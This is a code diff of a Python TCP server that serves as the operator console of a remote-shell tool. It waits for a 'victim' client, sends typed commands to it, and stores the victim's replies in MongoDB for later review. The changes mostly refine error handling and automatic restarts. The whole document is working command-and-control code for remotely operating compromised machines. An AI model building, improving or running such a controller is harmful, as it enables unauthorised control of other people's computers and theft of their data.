@@ -6,7 +6,7 @@ import time
 import signal
 from sys import exit
 
-errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception, BrokenPipeError)
+errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception)
 signal.signal(signal.SIGINT, signal.SIG_DFL)
 
 
@@ -24,11 +24,12 @@ class ServerTcp:
             self.s.bind((ip_server, port))
 
         except errors_might_happen as e:
-            print("Error in connection", e)
+            self.print_errors(e, before_s=True)
             return
 
         self.s.listen(5)
-        print("Ur server is running")
+        print("Server is running")
+        self.need_enter_msg = False
         self.start_conn()
 
     def test_connection(self):
@@ -36,8 +37,18 @@ class ServerTcp:
             time.sleep(2)
             try:
                 self.client_socket.send("CHECKING CONNECTION".encode())
-            except errors_might_happen:
-                self.connection = False
+            except errors_might_happen as e:
+                self.print_errors(e)
+
+    def print_errors(self, e, before_s=False):  # print Errors & make sure class exit.
+        if before_s:
+            print(f"\n# {e}")
+            return
+        if self.connection:  # to make sure msgs will not be repeated.
+            self.connection = False
+            print(f"\n# {e}")
+            if self.need_enter_msg:
+                print('# Connection Closed - press Enter To restart Server')
 
     def start_conn(self):
         """Function that waits for client connection."""
@@ -55,17 +66,24 @@ class ServerTcp:
 
     def connection_open(self):
         """Interacting with the connection."""
-        self.connection, get_victim_pwd, swap = True, True, ''
+        get_victim_pwd, swap = True, ''
 
         while self.connection:
             if get_victim_pwd:
-                get_victim_pwd = self.client_socket.recv(100).decode()
+                try:
+                    get_victim_pwd = self.client_socket.recv(1024).decode()
+                except errors_might_happen as e:
+                    self.print_errors(e)
+                    break
                 swap = get_victim_pwd
             else:
                 get_victim_pwd = swap
+
             while self.connection:
+                self.need_enter_msg = True
                 msg = input(f"{get_victim_pwd} > ").strip()
                 if msg:
+                    self.need_enter_msg = False
                     break
             if msg in ['exit', 'get_op', 'get_last']:
                 get_victim_pwd = False
@@ -75,20 +93,21 @@ class ServerTcp:
                 for i in self.mycol.find():
                     print(i['data'])
             elif msg == 'get_last':  # get last return of victim.
-                print(self.mycol.find_one({'sender': 'client'}, sort=[('_id', pymongo.DESCENDING)])['data'])
-
+                try:
+                    print(self.mycol.find_one({'sender': 'client'}, sort=[('_id', pymongo.DESCENDING)])['data'])
+                except TypeError:
+                    print("### No Client Data in DB .. yet. ##")
             else:
                 get_victim_pwd = True
                 try:
                     self.client_socket.send(msg.encode())
                     self.mycol.insert_one({"data": msg, 'sender': 'SERVER'})
-                    print("\n[[sent]]\n")
 
                 except errors_might_happen as e:
-                    print("Connection is Closed : ", e)
-                    self.start_conn()
+                    self.print_errors(e)
 
 
 while True:
     ServerTcp(port=50000)
+    print('-' * 20 + 'Restarting Server' + '-' * 20)
     time.sleep(2)
